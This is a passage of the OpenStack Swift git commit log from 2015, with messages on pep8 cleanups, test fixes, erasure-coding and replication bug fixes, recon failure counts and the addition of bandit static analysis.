commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit 207dd9b49d7d53a9faa4849af2c40bb875416fce
Author: Darrell Bishop <darrell@swiftstack.com>
Date: Thu Jul 30 14:32:08 2015 -0700
Fix regression in WSGI server SIGHUP behavior
The SIGHUP receipt used to pop us out of an os.wait() where now, it's in
a "green" wait() and Timeout() combo, some part of which eats the signal
receipt. This causes the while loop condition to never get checked and
SIGHUP no longer works as a server reload command.
The fix is to loop at least every 0.5 seconds, as a trade-off between
not busy-waiting and checking the "keep running" condition often enough
to feel responsive.
Change-Id: I95283b8b7cfc2998ab5813e0ad3ca1fa231696c8
Closes-Bug: #1479972
commit bcd00d9461603db1477c5f1e9f8dd6405a319eb9
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Jun 8 19:40:56 2015 +0100
Refactor diskfile
This patch mostly eliminates the duplicate code that was
deliberately left in place during EC review to avoid major
churn of the diskfile module prior to the kilo release.
This focuses on obvious de-duplication and shuffling code
between classes. It deliberately does not attempt to
hammer out every last piece of de-duplication where that
would introduce more complex changes - that can come later.
Code is moved from the module level and from ECDiskFile\*
classes into new BaseDiskFile\* classes.
Concrete classes for replication and EC policy retain their
existing names i.e. DiskFile[Manager|Writer|Reader|] and
ECDiskFile[Manager|Writer|Reader|] respectively.
Knock-on changes:
- fix bug whereby get\_hashes was ignoring self.reclaim\_age
and always using the default arg value.
- replication diskfile manager now deletes a tombstone that is older
than reclaim\_age even when there is a newer .meta file.
- replication diskfile manager will no longer raise an
AssertionError if only a .meta file is found during
hash\_cleanup\_listdir.
- fix stale test in test\_auditor.py: test\_with\_tombstone test
setup was convoluted (probably dates back to when object puts
did not clean up the object dir). Now that they do you have to
try harder to create a dir with a tombstone and a data file.
Change-Id: I963e0d0ae0d6569ad1de605034c529529cbb4f9a
commit 9cb7eb4a4b6cdab8a5f16b3dc800b39ab4068522
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 11:34:07 2015 +0200
Update hacking to 0.10.0
Replace the whitelist of flake8 checks (select) with a blacklist
(ignore). It makes possible to disable a single check, which was not
possible before. This new approach permits to enable new tests more
easily and see which checks are currently disabled.
Only new checks are disabled, this change doesn't run less checks than
before. Currently, many checks are disabled, but following changes will
fix these new warnings.
When the "select" option of flake8 is used in tox.ini, the "ignore"
option is ignored. It is not possible to use "select" and "ignore"
options at the same time. See the code in pep8 (flake8 is based on
pep8):
https://github.com/PyCQA/pep8/blob/d48eef071003952ed0f98445dc3dc6bc29618f9c/pep8.py#L1808
The purpose of flake8 is to enhance the coding style, but also to help
to detect common bugs. Blacklisting checks permits to detect new bugs
when upgrading the tools. For example, new checks were recently added to
help porting code to Python 3.
This change permits to use pbr 1.0 and newer which is required to
support Python 3. Previously, hacking 0.8.1 was used, but hacking 0.8 is
incompatible with pbr 1.0 and newer (hacking 0.8 requires pbr<1.0).
pbr 1.0 is required to use environment markers on requirements to
install dnspython on Python 2 and dnspython3 on Python 3.
Change-Id: I41d63b9467083d7606ad18aaa398ca7738b27fae
commit 389a97e3526df68121cecfaf1909343b5d381cbc
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed Jul 29 23:46:58 2015 +0200
Fix pep8 E warning for hacking 0.10
Fix pep8 warnings of the E category of hacking 0.10:
\* E113: unexpected indentation
\* E121: continuation line under-indented for hanging indent
\* E122: continuation line missing indentation or outdented
\* E123: closing bracket does not match indentation of opening bracket's
line
\* E126: continuation line over-indented for hanging indent
\* E251: unexpected spaces around keyword / parameter equals
Change-Id: I0b24eebdf1a37dc1b572b6c9a3d3d4832d050237
commit d719064e788ec5fa70305fadaa46affcb603a9bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:28:44 2015 +0200
Fix warning pep8 E128 warning of hacking 0.10
Fix the warning E128: "continuation line under-indented for visual
indent" of pep8.
Change-Id: Ie6c6ae341fe3d6281f2095c1d756d552fa5937f9
commit a0db56dcde83096708e6fe64ae9338098e0ba98a
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:16:06 2015 +0200
Fix pep8 E265 warning of hacking 0.10
Fix the warning E265 "block comment should start with '# '" added in pep
1.5.
Change-Id: Ib57282e958be9c7cddffc7bca34fbbf1d4c460fd
commit 345785837f1caa01fec5bca091c70481d7069bea
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jul 30 13:11:00 2015 +0800
Remove error\_suppression\_interval, error\_suppression\_limit options.
These two options is belong to proxy-server, not account-replicator.
Change-Id: Ie030ecffd213e56db32df77c69b847479d96308f
commit 5a7383313b1c555df5fd47050f7ee3810b5e31fc
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Tue Jul 28 19:15:25 2015 -0400
Swift documentation for first-time contributors.
In this change, there are proposed improvement to Swift documentation aimed at
first-time contributors. They include a simplification of the Getting
Started page and a new page with some basic instructions/commands that the
first-time contributor should know. In addition, it shows some common errors
that the first-time contributor may find when executing git rebase and
information on how to track your changes.
Change-Id: I704202955093736b2f3b4102a649690a0392c6b0
commit 5b5c8820024141bc6ae49d7646a92fb53667ea9b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Jul 29 12:36:35 2015 +0100
Remove unused code in swift/obj/server.py
keep\_cache was defined twice
Change-Id: I5f775f618669e3dabfc3bc54dd7bd2cd7f00b2f0
commit 0c27cb07caf1027cd9734e8bd34d9759da33e667
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Wed Jul 29 06:36:01 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: Ic30cb1dc8f12280a52cc1f07a1cf516397ed680e
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit 117b61976fbf14d8a0d2157256f9a3230421ee72
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Jul 22 15:40:55 2015 -0700
functests: use assertIn and assertNotIn
We have a bunch of assertions like
self.assertTrue(resp.status in (200, 204))
Sometimes we get smart about failure messages and have something like
self.assertTrue(resp.status in (200, 204), resp.status)
so we can see what the status was when it failed.
Since we don't have to support Python 2.6 any more, we can use
assertIn/assertNotIn and get nice failure messages for free.
Change-Id: I2d46c9969d41207a89e01017b4c2bc533c3d744f
commit 8fe8bee7e0c5c9d34d7a8e6ab090c8d65c5ca78e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 18:06:32 2015 +0530
test/(functional, probe): Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not generate warnings
all over the screen.
Change-Id: I74705c6498249337bfdf955d62e0ad972035bc1f
commit 4a6e0ccc69302a5384b988149e294656323d7f20
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 11:58:35 2015 -0700
Rename WsgiStringIO -> WsgiBytesIO.
If we're going to have a subclass of BytesIO, having "StringIO" in its
name is just asking for confusion.
Change-Id: I695ab3105b1a02eb158dcf0399ae91888bc1c0ac
commit 5ee742c17d9ea92ca7332cb67db0cce64b7a0d8f
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Fri Jul 24 21:19:47 2015 +0530
Modifying Lambda function tuple usage for python3
Current tuple unpacking is not supported in python3
Change-Id: I15a8e977684d19154cf2233caf1174f6983ac9e2
commit 6f89f71f9ba11f7b4126b80076a0f13792332e1e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Apr 15 16:17:23 2015 +0100
Filter Etag key from ssync replication-headers
ssync rx sends a header X-Backend-Replication-Headers whose value is a
list of headers that the source object has. This list extends the list
of allowed headers on the target object server, so that the target
object metadata is faithfully reconstructed to match the source.
Unfortunately the combination of lower() and title() operations on
header keys results in the source 'ETag' value being added to the target
metadata under the key 'Etag' in addition to the 'ETag' key that the
receiving server adds (note different capitilization), both having
the same value.
The spurious 'Etag' metadata is potentially confusing for humans
inspecting the object metadata and complicates tests that wish to
assert the equality of two object metadata dicts. See for example the
test in test\_ssync\_sender.py that this patch cleans up.
Furthermore, the possibility of having both Etag and ETag keys has
required a workaround in the EC reconstructor [1].
[1] reconstructor fix change id: Ie59ad93a67a7f439c9a84cd9cff31540f97f334a
Change-Id: I0c89cf7924a4471bb6d268b5ef3884e2d2cb4286
commit e2f69138bf5fcdd84ac23be6b0bec1bb006b41f5
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 16:46:48 2015 -0700
Fix string formatting in dispersion cli command
... and add a basic test that would have prevented the regression
Change-Id: I4c5f643ee291dcc1397ca951450459d8b8ad0bbd
commit 83025ff38dfea3d4e3f27dc045128a7aa4ba11e4
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Jul 24 11:09:10 2015 -0700
Use right most occurrence object dir in diskfile.extract\_policy
I like using the rightmost one more; it's basically
/operator-defined/mountpoint/objects/part/suffix/hash/ts.data, so I
don't see any opportunity for other things named "objects" to creep in on the
right of the real objects-N dir; but I could see some admin using
/srv/object-storage/ or something
-- Torgomatic The Wise
Change-Id: I0a63a3e02df091a5ee2e110a345183012e357a2f
commit 363a256e58ee0f3e9f059352c2de968e3dc398e3
Author: Falk Reimann <falk.reimann@sap.com>
Date: Wed Jun 24 16:54:02 2015 +0200
Support keystone v3 domains in swift-dispersion
This provides the capability to specify a project\_name,
project\_domain\_name and user\_domain\_name in /etc/swift/dispersion.conf.
If this values are set in dispersion.conf they get populated to the
swift-client. With this it is possible to have a specific dispersion
project specified, which is not the keystone default domain. Changes
